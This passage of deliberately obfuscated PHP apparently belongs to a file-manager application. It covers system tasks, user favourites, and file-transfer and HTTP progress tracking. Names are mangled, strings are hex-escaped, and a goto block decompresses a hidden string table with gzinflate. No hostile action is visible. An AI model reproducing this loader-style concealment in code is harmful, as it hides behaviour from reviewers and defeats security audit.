$—úÀª³Í[$±Ê•¢ÌŠ[443]] : $±Ê•¢ÌŠ[12]; } public function sort($ààç¿ø®, $…Ôşôúí) { return parent::update($ààç¿ø®, $…Ôşôúí); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\164\x61\163\153\x4c\151\163\x74"; public $field = array("\156\x61\155\x65", "\164\x79\x70\x65", "\145\x76\x65\156\164", "\x74\151\155\145", "\144\x65\x73\143", "\x73\x79\x73\164\145\x6d", "\145\156\x61\142\154\x65", "\154\141\163\164\x52\x75\156", "\x73\x6f\x72\x74"); public function listData($ÕØÍ™å­ = false, $ˆÌéèÃ = "\163\x6f\162\164", $Õø´Í¨± = false) { return parent::listData($ÕØÍ™å­, $ˆÌéèÃ, $Õø´Í¨±); } public function add($‰Ó€½ùä) { $Æ¯¬û’Ş =& $_SERVER[çâ¥×ø³]; $ÎÈîûà“ = $this->findByName($‰Ó€½ùä[$Æ¯¬û’Ş[32]]); if ($ÎÈîûà“) { return !1; } $‰Ó€½ùä[$Æ¯¬û’Ş[1658]] = 0; $‰Ó€½ùä[$Æ¯¬û’Ş[1923]] = $this->getSort(); return parent::insert($‰Ó€½ùä); } private function getSort() { $âÛÛ¡‘å =& $_SERVER[çâ¥×ø³]; $Õ‡¡¬ïÁ = parent::listData(); $¿ÙİÆ = array_to_keyvalue($Õ‡¡¬ïÁ, $âÛÛ¡‘å[12], $âÛÛ¡‘å[1923]); return empty($¿ÙİÆ) ? 0 : max($¿ÙİÆ) + 1; } public function update($üÈ­†óû, $şã˜Çğ) { $ÃÇ¿½¡Î =& $_SERVER[çâ¥×ø³]; $’–¢ÅÖ– = $this->listData($üÈ­†óû); $ûß”î‡ = $this->findByName($şã˜Çğ[$ÃÇ¿½¡Î[32]]); if (!$’–¢ÅÖ– || $ûß”î‡ && $ûß”î‡[$ÃÇ¿½¡Î[443]] != $’–¢ÅÖ–[$ÃÇ¿½¡Î[443]]) { return !1; } return parent::update($üÈ­†óû, $şã˜Çğ); } public function remove($åª÷óÊÕ, $âŒÕ„Ë‘ = false) { $´á”ªÒ =& $_SERVER[çâ¥×ø³]; $Œ¹¦¦˜ = $this->listData($åª÷óÊÕ); if (!$Œ¹¦¦˜) { return; } if (!$âŒÕ„Ë‘ && $Œ¹¦¦˜[$´á”ªÒ[179]] == $´á”ªÒ[88]) { return !1; } return parent::remove($åª÷óÊÕ); } public function enable($øæ¸¦Ûş, $™¡êôÃ) { return $this->update($øæ¸¦Ûş, array($_SERVER[çâ¥×ø³][2335] => $™¡êôÃ)); } public function run($¶¾›¼Ñ) { return $this->update($¶¾›¼Ñ, array($_SERVER[çâ¥×ø³][2348] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ùÛáó¡’) { $ÕÄ‚î¾… =& $_SERVER[çâ¥×ø³]; return array($ÕÄ‚î¾…[2010] => array(USER_ID, $ÕÄ‚î¾…[2349])); } protected function listData() { $¦Š¦¡Ì  =& $_SERVER[çâ¥×ø³]; $Âöø›û¥ = array($¦Š¦¡Ì [1692] => USER_ID, $¦Š¦¡Ì [525] => 0); $œ‘Äû› = $¦Š¦¡Ì [2350]; $ºÀİØè = $this->field($œ‘Äû›)->where($Âöø›û¥)->order($¦Š¦¡Ì [2351])->select(); return $ºÀİØè ? $ºÀİØè : array(); } protected function resetCache() { } protected function listView() { $é¥ÑáõÇ =& $_SERVER[çâ¥×ø³]; $ò’ÎûÑæ = $this->listData(); $›ÈÅÖü = array_filter_by_field($ò’ÎûÑæ, $é¥ÑáõÇ[33], $é¥ÑáõÇ[458]); $Å™±Ä†Ú = array_to_keyvalue($›ÈÅÖü, $é¥ÑáõÇ[12], $é¥ÑáõÇ[84]); if (!$Å™±Ä†Ú) { return $ò’ÎûÑæ; } $ÒÚóÍ´° = 2000; $ØÓå–Ä½ = array($é¥ÑáõÇ[459] => array($é¥ÑáõÇ[460], $Å™±Ä†Ú)); $ÁùõŸ« = Model($é¥ÑáõÇ[874])->listSource($ØÓå–Ä½, $ÒÚóÍ´°); $ÁùõŸ« = array_merge($ÁùõŸ«[$é¥ÑáõÇ[83]], $ÁùõŸ«[$é¥ÑáõÇ[82]]); $ÁùõŸ« = array_to_keyvalue($ÁùõŸ«, $é¥ÑáõÇ[181]); foreach ($ò’ÎûÑæ as $¤ÒÃÉ¾ö => $¾í¿öúß) { $—Ö¯³ºÖ = $ÁùõŸ«[$¾í¿öúß[$é¥ÑáõÇ[84]]]; $—Ö¯³ºÖ = $—Ö¯³ºÖ ? $—Ö¯³ºÖ : array(); $ò’ÎûÑæ[$¤ÒÃÉ¾ö] = array_merge($—Ö¯³ºÖ, $¾í¿öúß); } return $ò’ÎûÑæ; } protected function addFav($õööŞº, $¿æ”ğì = '', $í®µãü = "\163\157\x75\162\x63\x65") { $üĞ¹ï—™ =& $_SERVER[çâ¥×ø³]; $ıÁÍºëš = array($üĞ¹ï—™[1692] => USER_ID, $üĞ¹ï—™[525] => 0, $üĞ¹ï—™[464] => $í®µãü, $üĞ¹ï—™[463] => $õööŞº); if ($this->where($ıÁÍºëš)->find()) { return !1; } $ıÁÍºëš = array($üĞ¹ï—™[1692] => USER_ID, $üĞ¹ï—™[525] => 0); $çüàŞ« = $this->where($ıÁÍºëš)->max($üĞ¹ï—™[1923]); if (!$çüàŞ«) { $çüàŞ« = 0; } if (!$¿æ”ğì && $í®µãü == $üĞ¹ï—™[458]) { $®¢ä‡§³ = Model($üĞ¹ï—™[1385])->where(array($üĞ¹ï—™[459] => $õööŞº))->find(); if (!$®¢ä‡§³) { return !1; } $¿æ”ğì = $®¢ä‡§³[$üĞ¹ï—™[32]]; } $¿æ”ğì = $this->getAutoName($¿æ”ğì); $­¸Ô‘¤ = array($üĞ¹ï—™[1692] => USER_ID, $üĞ¹ï—™[525] => 0, $üĞ¹ï—™[462] => $¿æ”ğì, $üĞ¹ï—™[463] => $õööŞº, $üĞ¹ï—™[464] => $í®µãü, $üĞ¹ï—™[1903] => $çüàŞ« + 1); return $this->add($­¸Ô‘¤); } protected function remove($Ğ—ÄÔù„) { $·Ñ”„Óƒ =& $_SERVER[çâ¥×ø³]; $¨Í•ù¸¢ = array($·Ñ”„Óƒ[1692] => USER_ID, $·Ñ”„Óƒ[461] => $Ğ—ÄÔù„); return $this->where($¨Í•ù¸¢)->delete(); } protected function removeByName($¹‡ú›Ü) { $Öì´ì§ˆ =& $_SERVER[çâ¥×ø³]; $Ì÷İèş = array($Öì´ì§ˆ[1692] => USER_ID, $Öì´ì§ˆ[462] => $¹‡ú›Ü, $Öì´ì§ˆ[525] => 0); return $this->where($Ì÷İèş)->delete(); } protected function rename($æŠÔ±ı, $¦¦„´–Ÿ) { $¶Š‹‡µ =& $_SERVER[çâ¥×ø³]; if ($æŠÔ±ı == $¦¦„´–Ÿ) { return !1; } $©š—é‹û = $this->getAutoName($¦¦„´–Ÿ); if ($¦¦„´–Ÿ != $©š—é‹û) { return !1; } $…†–‘”“ = array($¶Š‹‡µ[1692] => USER_ID, $¶Š‹‡µ[525] => 0, $¶Š‹‡µ[32] => $æŠÔ±ı); return $this->where($…†–‘”“)->save(array($¶Š‹‡µ[32] => $¦¦„´–Ÿ)); } protected function resetSort($ÁÙ°Œàö) { $¾°È¾€ò =& $_SERVER[çâ¥×ø³]; $ÁÙ°Œàö = is_array($ÁÙ°Œàö) ? $ÁÙ°Œàö : array(); $ºÙ–¬“ = array($¾°È¾€ò[1692] => USER_ID); for ($Ê²ËäÉø = 0; $Ê²ËäÉø < count($ÁÙ°Œàö); $Ê²ËäÉø++) { $ºÙ–¬“[$¾°È¾€ò[461]] = $ÁÙ°Œàö[$Ê²ËäÉø]; $this->where($ºÙ–¬“)->save(array($¾°È¾€ò[1903] => $Ê²ËäÉø + 1)); } return !0; } protected function moveTop($’àõá”¬) { $®ªßóÛ =& $_SERVER[çâ¥×ø³]; $·ù‡êØ¸ = array($®ªßóÛ[1692] => USER_ID, $®ªßóÛ[525] => 0); $‡ÒÇí² = $this->where($·ù‡êØ¸)->where(array($®ªßóÛ[32] => $’àõá”¬))->find(); if (!$‡ÒÇí²) { return; } $øÛ·ïÏ = $this->field($®ªßóÛ[443])->where($·ù‡êØ¸)->order($®ªßóÛ[2351])->select(); $øÛ·ïÏ = array_to_keyvalue($øÛ·ïÏ, $®ªßóÛ[12], $®ªßóÛ[443]); $„¦öÚ „ = $øÛ·ïÏ; $øÛ·ïÏ = array_remove_value($øÛ·ïÏ, $‡ÒÇí²[$®ªßóÛ[443]]); array_unshift($øÛ·ïÏ, $‡ÒÇí²[$®ªßóÛ[443]]); return $this->resetSort($øÛ·ïÏ); } protected function moveBottom($ì‚ë´á‡) { $—˜¢âˆã =& $_SERVER[çâ¥×ø³]; $‘Èé€áŸ = array($—˜¢âˆã[1692] => USER_ID, $—˜¢âˆã[525] => 0); $ˆ¡‹İù = $this->where($‘Èé€áŸ)->max($—˜¢âˆã[1923]); $äæĞñ‘Û = array($—˜¢âˆã[1923] => $ˆ¡‹İù + 1); return $this->where($‘Èé€áŸ)->where(array($—˜¢âˆã[32] => $ì‚ë´á‡))->save($äæĞñ‘Û); } private function getAutoName($äáğ‡”) { $ßÉ’™€ =& $_SERVER[çâ¥×ø³]; $·½ŒÂ = array($ßÉ’™€[1692] => USER_ID, $ßÉ’™€[525] => 0); $×õ¢÷„ = $this->field($ßÉ’™€[32])->where($·½ŒÂ)->select(); $×õ¢÷„ = array_to_keyvalue($×õ¢÷„, $ßÉ’™€[12], $ßÉ’™€[32]); if (!$×õ¢÷„ || !in_array($äáğ‡”, $×õ¢÷„)) { return $äáğ‡”; } for ($íßë©• = 0; $íßë©• < count($×õ¢÷„); $íßë©•++) { if (!in_array($äáğ‡” . "\50{$íßë©•}\x29", $×õ¢÷„)) { return $äáğ‡” . "\x28{$íßë©•}\x29"; } } return $äáğ‡” . "\x28{$íßë©•}\x29"; } } goto AÄ›ğœÄáˆ; c‡»’µ›ÁÌ: $_SERVER[ĞİŞñ©] = explode($_SERVER[çâ¥×ø³][649], gzinflate(substr($_SERVER[çâ¥×ø³][650], 10, -8))); $tzuvbhsklr = $_SERVER[çâ¥×ø³][651]; if (!$tzuvbhsklr) { return; } goto bËóª½ß‰; dã¨ùíóÜ: class TaskFileTransfer extends Task { protected function startAfter() { $©Ê·Ç…Ş =& $_SERVER[çâ¥×ø³]; $ú¡€„”  =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($©Ê·Ç…Ş[1731], array($this, $©Ê·Ç…Ş[1732])); Hook::bind($©Ê·Ç…Ş[1276], array($this, $©Ê·Ç…Ş[1733])); Hook::bind($©Ê·Ç…Ş[1734], array($this, $©Ê·Ç…Ş[1735])); Hook::bind($©Ê·Ç…Ş[636], array($this, $©Ê·Ç…Ş[1736])); Hook::bind($©Ê·Ç…Ş[637], array($this, $©Ê·Ç…Ş[1737])); Hook::bind($©Ê·Ç…Ş[644], array($this, $©Ê·Ç…Ş[1738])); Hook::bind($©Ê·Ç…Ş[645], array($this, $©Ê·Ç…Ş[1739])); Hook::bind($©Ê·Ç…Ş[639], array($this, $©Ê·Ç…Ş[1740])); Hook::bind($©Ê·Ç…Ş[642], array($this, $©Ê·Ç…Ş[1741])); Hook::bind($©Ê·Ç…Ş[605], array($this, $©Ê·Ç…Ş[1742])); Hook::bind($©Ê·Ç…Ş[602], array($this, $©Ê·Ç…Ş[1742])); Hook::bind($©Ê·Ç…Ş[607], array($this, $©Ê·Ç…Ş[1742])); Hook::bind($©Ê·Ç…Ş[609], array($this, $©Ê·Ç…Ş[1742])); Hook::bind($©Ê·Ç…Ş[611], array($this, $©Ê·Ç…Ş[1742])); Hook::bind($©Ê·Ç…Ş[1743], array($this, $©Ê·Ç…Ş[1744])); Hook::bind($©Ê·Ç…Ş[627], array($this, $©Ê·Ç…Ş[1745])); $this->sourceModelCopyFlag = !1; Hook::bind($©Ê·Ç…Ş[1746], array($this, $©Ê·Ç…Ş[1747])); Hook::bind($©Ê·Ç…Ş[1748], array($this, $©Ê·Ç…Ş[1749])); Hook::bind($©Ê·Ç…Ş[1750], array($this, $©Ê·Ç…Ş[1751])); $ú¡€„” [$©Ê·Ç…Ş[1752]] = LNG($©Ê·Ç…Ş[1753]); $ú¡€„” [$©Ê·Ç…Ş[1754]] = 0; $ú¡€„” [$©Ê·Ç…Ş[1755]] = 0; $ú¡€„” [$©Ê·Ç…Ş[1117]] = $©Ê·Ç…Ş[12]; $ú¡€„” [$©Ê·Ç…Ş[1756]] = $©Ê·Ç…Ş[12]; $ú¡€„” [$©Ê·Ç…Ş[1757]] = 0; $ú¡€„” [$©Ê·Ç…Ş[1758]] = 0; $ú¡€„” [$©Ê·Ç…Ş[1759]] = 0; if (!$ú¡€„” [$©Ê·Ç…Ş[1598]]) { $ú¡€„” [$©Ê·Ç…Ş[1598]] = LNG($©Ê·Ç…Ş[1760]); } } protected function endAfter() { $Ì÷„ÉÇ =& $_SERVER[çâ¥×ø³]; Hook::unbind($Ì÷„ÉÇ[1731], array($this, $Ì÷„ÉÇ[1732])); Hook::unbind($Ì÷„ÉÇ[1276], array($this, $Ì÷„ÉÇ[1733])); Hook::unbind($Ì÷„ÉÇ[1734], array($this, $Ì÷„ÉÇ[1735])); Hook::unbind($Ì÷„ÉÇ[636], array($this, $Ì÷„ÉÇ[1736])); Hook::unbind($Ì÷„ÉÇ[637], array($this, $Ì÷„ÉÇ[1737])); Hook::unbind($Ì÷„ÉÇ[644], array($this, $Ì÷„ÉÇ[1738])); Hook::unbind($Ì÷„ÉÇ[645], array($this, $Ì÷„ÉÇ[1739])); Hook::unbind($Ì÷„ÉÇ[639], array($this, $Ì÷„ÉÇ[1740])); Hook::unbind($Ì÷„ÉÇ[642], array($this, $Ì÷„ÉÇ[1741])); Hook::unbind($Ì÷„ÉÇ[605], array($this, $Ì÷„ÉÇ[1742])); Hook::unbind($Ì÷„ÉÇ[602], array($this, $Ì÷„ÉÇ[1742])); Hook::unbind($Ì÷„ÉÇ[607], array($this, $Ì÷„ÉÇ[1742])); Hook::unbind($Ì÷„ÉÇ[609], array($this, $Ì÷„ÉÇ[1742])); Hook::unbind($Ì÷„ÉÇ[611], array($this, $Ì÷„ÉÇ[1742])); Hook::unbind($Ì÷„ÉÇ[1743], array($this, $Ì÷„ÉÇ[1744])); Hook::unbind($Ì÷„ÉÇ[627], array($this, $Ì÷„ÉÇ[1745])); Hook::unbind($Ì÷„ÉÇ[1746], array($this, $Ì÷„ÉÇ[1747])); Hook::unbind($Ì÷„ÉÇ[1748], array($this, $Ì÷„ÉÇ[1749])); Hook::unbind($Ì÷„ÉÇ[1750], array($this, $Ì÷„ÉÇ[1751])); } public function copyMoveStart($ÀÀ³‰˜, $Ş¢¥¼Ì›, $ñ¼§™˜, $¿ˆ»ÄÌ‹) { $‚¼ôıƒè =& $_SERVER[çâ¥×ø³]; self::log($‚¼ôıƒè[1761] . $Ş¢¥¼Ì› . $‚¼ôıƒè[70] . $¿ˆ»ÄÌ‹); $ŸÆş¼„³ = rtrim(TEMP_FILES, $‚¼ôıƒè[8]); if (substr($Ş¢¥¼Ì›, 0, strlen($ŸÆş¼„³)) == $ŸÆş¼„³) { return; } if (substr($¿ˆ»ÄÌ‹, 0, strlen($ŸÆş¼„³)) == $ŸÆş¼„³) { return; } $´¯²«¦ó =& $this->task; $´¯²«¦ó[$‚¼ôıƒè[1762]] = KodIO::transferType($ÀÀ³‰˜, $ñ¼§™˜); $this->update(); } public function updateAfter() { $àº¤ñ…™ =& $_SERVER[çâ¥×ø³]; $°›É•­ =& $this->task; if (!$°›É•­[$àº¤ñ…™[812]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($°›É•­[$àº¤ñ…™[1762]] == $àº¤ñ…™[1368]) { return; } self::updateTask($°›É•­); } private static function updateTask(&$ÕÜ€¹ò) { $œ«úñ• =& $_SERVER[çâ¥×ø³]; if ($ÕÜ€¹ò[$œ«úñ•[1762]] == $œ«úñ•[1247] || $ÕÜ€¹ò[$œ«úñ•[1762]] == $œ«úñ•[107]) { if ($ÕÜ€¹ò[$œ«úñ•[1756]]) { $ÕÜ€¹ò[$œ«úñ•[1759]] = $ÕÜ€¹ò[$œ«úñ•[1758]] + $ÕÜ€¹ò[$œ«úñ•[1755]]; } } else { if ($ÕÜ€¹ò[$œ«úñ•[1762]] == $œ«úñ•[1369]) { if ($ÕÜ€¹ò[$œ«úñ•[1756]] == $œ«úñ•[1247]) { $ÕÜ€¹ò[$œ«úñ•[1759]] = $ÕÜ€¹ò[$œ«úñ•[1758]] + $ÕÜ€¹ò[$œ«úñ•[1755]] * 0.5; } else { if ($ÕÜ€¹ò[$œ«úñ•[1756]] == $œ«úñ•[107]) { $ÕÜ€¹ò[$œ«úñ•[1759]] = $ÕÜ€¹ò[$œ«úñ•[1758]] + $ÕÜ€¹ò[$œ«úñ•[1754]] * 0.5 + $ÕÜ€¹ò[$œ«úñ•[1755]] * 0.5; } } } } $ÕÜ€¹ò[$œ«úñ•[1703]] = $ÕÜ€¹ò[$œ«úñ•[1759]] / $ÕÜ€¹ò[$œ«úñ•[812]]; if ($ÕÜ€¹ò[$œ«úñ•[1703]] > 0) { $›ó×èå = timeFloat() - $ÕÜ€¹ò[$œ«úñ•[1705]] - $ÕÜ€¹ò[$œ«úñ•[1708]]; $ÕÜ€¹ò[$œ«úñ•[1709]] = $›ó×èå * (1 - $ÕÜ€¹ò[$œ«úñ•[1703]]) / $ÕÜ€¹ò[$œ«úñ•[1703]]; } } public function addPath($ĞÄ‡Äší) { $‹©¾ãäŠ =& $_SERVER[çâ¥×ø³]; if (!$ĞÄ‡Äší) { return; } $„çŒÎÉ´ =& $this->task; $ÇşÄÛ = IO::infoWithChildren($ĞÄ‡Äší); $ñÊËÏ—º = $„çŒÎÉ´[$‹©¾ãäŠ[1763]] ? $„çŒÎÉ´[$‹©¾ãäŠ[1763]][$‹©¾ãäŠ[1764]] : 0; $„çŒÎÉ´[$‹©¾ãäŠ[1763]] = array($‹©¾ãäŠ[1764] => $ñÊËÏ—º + 1, $‹©¾ãäŠ[462] => $ÇşÄÛ[$‹©¾ãäŠ[32]], $‹©¾ãäŠ[84] => $ÇşÄÛ[$‹©¾ãäŠ[84]], $‹©¾ãäŠ[551] => $ÇşÄÛ[$‹©¾ãäŠ[551]] ? $ÇşÄÛ[$‹©¾ãäŠ[551]] : $ÇşÄÛ[$‹©¾ãäŠ[84]]); if ($ÇşÄÛ[$‹©¾ãäŠ[33]] == $‹©¾ãäŠ[214]) { $„çŒÎÉ´[$‹©¾ãäŠ[835]] += 1; } else { $„çŒÎÉ´[$‹©¾ãäŠ[835]] += $ÇşÄÛ[$‹©¾ãäŠ[79]][$‹©¾ãäŠ[77]]; if ($ÇşÄÛ[$‹©¾ãäŠ[181]]) { $„çŒÎÉ´[$‹©¾ãäŠ[835]] += $ÇşÄÛ[$‹©¾ãäŠ[79]][$‹©¾ãäŠ[78]] + 1; } } $„çŒÎÉ´[$‹©¾ãäŠ[812]] += $ÇşÄÛ[$‹©¾ãäŠ[76]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($¤†ãİœÇ) { } public function sourceAddHashEnd($³¿»™ñß) { } public function sourceAddFileStart($öÃşÃŒë) { $û„Ø¶ò =& $_SERVER[çâ¥×ø³]; $’İÔÒÈö =& $this->task; $’İÔÒÈö[$û„Ø¶ò[1754]] = $öÃşÃŒë[$û„Ø¶ò[76]]; $’İÔÒÈö[$û„Ø¶ò[1752]] = $öÃşÃŒë[$û„Ø¶ò[32]]; $’İÔÒÈö[$û„Ø¶ò[1117]] = $öÃşÃŒë[$û„Ø¶ò[32]]; $’İÔÒÈö[$û„Ø¶ò[1765]] = $öÃşÃŒë[$û„Ø¶ò[84]]; $this->update(); } public function sourceAddFileEnd($Ôºì¡) { $õÙé¸®° =& $_SERVER[çâ¥×ø³]; $…úÑÍØ´ =& $this->task; $…úÑÍØ´[$õÙé¸®°[1759]] += $Ôºì¡[$õÙé¸®°[76]]; $…úÑÍØ´[$õÙé¸®°[1765]] = $Ôºì¡[$õÙé¸®°[84]]; $this->update(1); } public function copyFileStart($ˆ†ƒñ¥Š, $™ä¥Ğº, $²˜Ş¦Ìù, $¸¼ÛË¸’, $‰É¼ ãŞ, $š±ùşÛŒ) { $Á¶ñ§Ú‘ =& $_SERVER[çâ¥×ø³]; $È±şáÆÚ = $‰É¼ ãŞ; if ($È±şáÆÚ == $GLOBALS[$Á¶ñ§Ú‘[1766]]) { $È±şáÆÚ = $GLOBALS[$Á¶ñ§Ú‘[1767]]; } $GLOBALS[$Á¶ñ§Ú‘[1767]] = $‰É¼ ãŞ; $GLOBALS[$Á¶ñ§Ú‘[1766]] = $š±ùşÛŒ; $İ‡ü“éô =& $this->task; $İ‡ü“éô[$Á¶ñ§Ú‘[1752]] = $È±şáÆÚ; $İ‡ü“éô[$Á¶ñ§Ú‘[1754]] = (int) $ˆ†ƒñ¥Š->size($™ä¥Ğº); $İ‡ü“éô[$Á¶ñ§Ú‘[1755]] = 0; $İ‡ü“éô[$Á¶ñ§Ú‘[1117]] = $Á¶ñ§Ú‘[12]; $İ‡ü“éô[$Á¶ñ§Ú‘[1756]] = $Á¶ñ§Ú‘[12]; $İ‡ü“éô[$Á¶ñ§Ú‘[1757]] = 0; $…”ê§ß¶ = $İ‡ü“éô[$Á¶ñ§Ú‘[1754]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($İ‡ü“éô[$Á¶ñ§Ú‘[443]] . $Á¶ñ§Ú‘[1768]); if ($…”ê§ß¶ && file_exists(get_path_father($¸¼ÛË¸’))) { Cache::set($İ‡ü“éô[$Á¶ñ§Ú‘[443]] . $Á¶ñ§Ú‘[1768], $¸¼ÛË¸’); $İ‡ü“éô[$Á¶ñ§Ú‘[1725]] = array($Á¶ñ§Ú‘[1769], $Á¶ñ§Ú‘[1770]); } $this->update(0, $…”ê§ß¶); } public static function updateCopyLocalFileSize($£Åëìï¶) { $ø¨×¾°Ä =& $_SERVER[çâ¥×ø³]; $ÔÈÂ˜³Ó = Cache::get($£Åëìï¶[$ø¨×¾°Ä[443]] . $ø¨×¾°Ä[1768]); if (!$ÔÈÂ˜³Ó || !file_exists($ÔÈÂ˜³Ó)) { return $£Åëìï¶; } $£Åëìï¶[$ø¨×¾°Ä[1755]] = @filesize($ÔÈÂ˜³Ó); $£Åëìï¶[$ø¨×¾°Ä[1759]] += $£Åëìï¶[$ø¨×¾°Ä[1755]]; self::updateTask($£Åëìï¶); return $£Åëìï¶; } public function copyFileEnd($ø½º¡ş¿, $ª©³Ê”‰, $şÍó´ßÆ, $¹‘Şı•, $Öä§ùÅÕ, $³‰µõôÖ) { $Ó’ªî¸‰ =& $_SERVER[çâ¥×ø³]; $ë ±§Ëì =& $this->task; $ë ±§Ëì[$Ó’ªî¸‰[1755]] = $ë ±§Ëì[$Ó’ªî¸‰[1754]]; $ë ±§Ëì[$Ó’ªî¸‰[1756]] = $Ó’ªî¸‰[12]; unset($ë ±§Ëì[$Ó’ªî¸‰[1725]]); if ($Öä§ùÅÕ == $ë ±§Ëì[$Ó’ªî¸‰[1752]]) { $ë ±§Ëì[$Ó’ªî¸‰[1758]] += $ë ±§Ëì[$Ó’ªî¸‰[1754]]; $ë ±§Ëì[$Ó’ªî¸‰[1759]] = $ë ±§Ëì[$Ó’ªî¸‰[1758]]; $í·÷Êûù = 1; if (isset($ë ±§Ëì[$Ó’ªî¸‰[1765]]) && $ë ±§Ëì[$Ó’ªî¸‰[1765]] == $ª©³Ê”‰) { $í·÷Êûù = 0; } $this->update($í·÷Êûù); } else { $this->update(); $ë ±§Ëì[$Ó’ªî¸‰[1755]] = 0; } Cache::remove($ë ±§Ëì[$Ó’ªî¸‰[443]] . $Ó’ªî¸‰[1768]); self::log($Ó’ªî¸‰[1771] . $ª©³Ê”‰ . $Ó’ªî¸‰[70] . $¹‘Şı• . $Ó’ªî¸‰[246] . $Öä§ùÅÕ . $Ó’ªî¸‰[1772] . $ë ±§Ëì[$Ó’ªî¸‰[1752]]); } public function updateFileEnd($İìä‚©ô, $ŒñèşÀ«) { $„Î¢‘Ñ =& $_SERVER[çâ¥×ø³]; $«—à©ÜŸ =& $this->task; $«—à©ÜŸ[$„Î¢‘Ñ[1752]] = $İìä‚©ô; $«—à©ÜŸ[$„Î¢‘Ñ[1754]] = $ŒñèşÀ«; $«—à©ÜŸ[$„Î¢‘Ñ[1758]] += $ŒñèşÀ«; $«—à©ÜŸ[$„Î¢‘Ñ[1759]] = $«—à©ÜŸ[$„Î¢‘Ñ[1758]]; $this->update(1); self::log($„Î¢‘Ñ[1773] . $İìä‚©ô); } public function sourceModelCopy($©©à¼äô) { $âìŒ§ =& $_SERVER[çâ¥×ø³]; $÷¶Ù¸ö– = $©©à¼äô[0]; $Ìßóºœ = $©©à¼äô[1]; $ŞÈÕÈË‡ =& $this->task; $this->sourceModelCopyFlag = !0; $¥Êó§—¨ = 0; switch ($÷¶Ù¸ö–) { case $âìŒ§[603]: $¥Êó§—¨ = 1; break; case $âìŒ§[606]: $ŞÈÕÈË‡[$âìŒ§[1752]] = $Ìßóºœ[$âìŒ§[32]]; break; case $âìŒ§[608]: $¥Êó§—¨ = intval($©©à¼äô[$âìŒ§[424]] * 0.4); break; case $âìŒ§[610]: $¥Êó§—¨ = intval($©©à¼äô[$âìŒ§[424]] * 0.2); break; case $âìŒ§[612]: $¥Êó§—¨ = intval($©©à¼äô[$âìŒ§[424]] * 0.4); break; } $this->update($¥Êó§—¨); $this->sourceModelCopyFlag = !1; } public function sourceRemove($Ù¾Ò†“, $øø©ÔÖñ) { $‹íÆÔ÷ =& $_SERVER[çâ¥×ø³]; $this->sourceModelCopyFlag = !0; $ í×ËĞ = 1; if (isset($Ù¾Ò†“[$‹íÆÔ÷[79]])) { $ í×ËĞ = $Ù¾Ò†“[$‹íÆÔ÷[79]][$‹íÆÔ÷[77]]; $ í×ËĞ = $ í×ËĞ + $Ù¾Ò†“[$‹íÆÔ÷[79]][$‹íÆÔ÷[78]] + 1; } $this->update($ í×ËĞ); $this->sourceModelCopyFlag = !1; } public function sourceMove($°ºÙœûè) { $this->sourceRemove($°ºÙœûè, !1); } public function curlProgress($ìÈ²“Ã, $šæ»Ó ½, $¾°í €ô, $¹±‡œšï, $ìúÙ«îÁ) { $òíÛ›áó =& $_SERVER[çâ¥×ø³]; $ß½ùÈ™¸ =& $this->task; if ($ìúÙ«îÁ > 0) { $ß½ùÈ™¸[$òíÛ›áó[1117]] = $òíÛ›áó[1774]; $ß½ùÈ™¸[$òíÛ›áó[1756]] = $òíÛ›áó[107]; if ($ß½ùÈ™¸[$òíÛ›áó[1754]]) { $ß½ùÈ™¸[$òíÛ›áó[1755]] = $ìúÙ«îÁ; } if ($ß½ùÈ™¸[$òíÛ›áó[1757]]) { $ß½ùÈ™¸[$òíÛ›áó[1755]] = $ìúÙ«îÁ + $ß½ùÈ™¸[$òíÛ›áó[1757]]; } } else { if ($¾°í €ô > 0) { if ($ß½ùÈ™¸[$òíÛ›áó[1754]] == $šæ»Ó ½) { $ß½ùÈ™¸[$òíÛ›áó[1755]] = $¾°í €ô; $ß½ùÈ™¸[$òíÛ›áó[1117]] = $òíÛ›áó[1775]; $ß½ùÈ™¸[$òíÛ›áó[1756]] = $òíÛ›áó[1247]; } } } $this->update(); } public function curlProgressStart($ÔÌ“Ÿè€) { } public function curlProgressEnd($«³ôóäÒ) { $¹¾Í¸¿‡ =& $_SERVER[çâ¥×ø³]; $¾ ûÈñê =& $this->task; $º‹ƒá¯Õ = curl_getinfo($«³ôóäÒ); $Ìô˜½ = $º‹ƒá¯Õ[$¹¾Í¸¿‡[1776]]; if ($Ìô˜½ == -1) { $Ìô˜½ = $º‹ƒá¯Õ[$¹¾Í¸¿‡[1777]]; } if ($¾ ûÈñê[$¹¾Í¸¿‡[1756]] == $¹¾Í¸¿‡[107] && $Ìô˜½) { $¾ ûÈñê[$¹¾Í¸¿‡[1757]] += $Ìô˜½; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $îÚ»‹ğ  =& $_SERVER[çâ¥×ø³]; $ş¾şÓò =& $this->task; $ş¾şÓò[$îÚ»‹ğ [1778]] = 1; Hook::bind($îÚ»‹ğ [1746], array($this, $îÚ»‹ğ [1779])); Hook::bind($îÚ»‹ğ [1748], array($this, $îÚ»‹ğ [1780])); Hook::bind($îÚ»‹ğ [1750], array($this, $îÚ»‹ğ [1781])); } protected function endAfter() { $Àæ‹É·ä =& $_SERVER[çâ¥×ø³]; Hook::unbind($Àæ‹É·ä[1746], array($this, $Àæ‹É·ä[1779])); Hook::unbind($Àæ‹É·ä[1748], array($this, $Àæ‹É·ä[1780])); Hook::unbind($Àæ‹É·ä[1750], array($this, $Àæ‹É·ä[1781])); } public function progressStart($Û‰÷Ìóû) { $î¶¦èĞë =& $_SERVER[çâ¥×ø³]; $¤ô˜ŸÎ = curl_getinfo($Û‰÷Ìóû); self::log($î¶¦èĞë[1782] . $¤ô˜ŸÎ[$î¶¦èĞë[351]]); self::valueSet($this->task[$î¶¦èĞë[443]], $this->task); } public function progressEnd($Ã˜…›¤) { $¡ØÑÏÉú =& $_SERVER[çâ¥×ø³]; self::log($¡ØÑÏÉú[1783] . $this->task[$¡ØÑÏÉú[443]]); $this->end(); } public function progress($å‡Šı’, $Õ‰ÙŒŒ¿, $¯Í¼ÒöÔ, $ûÀÔƒ¹, $Èšøéü­) { $ÂÎ Á‰š =& $_SERVER[çâ¥×ø³]; 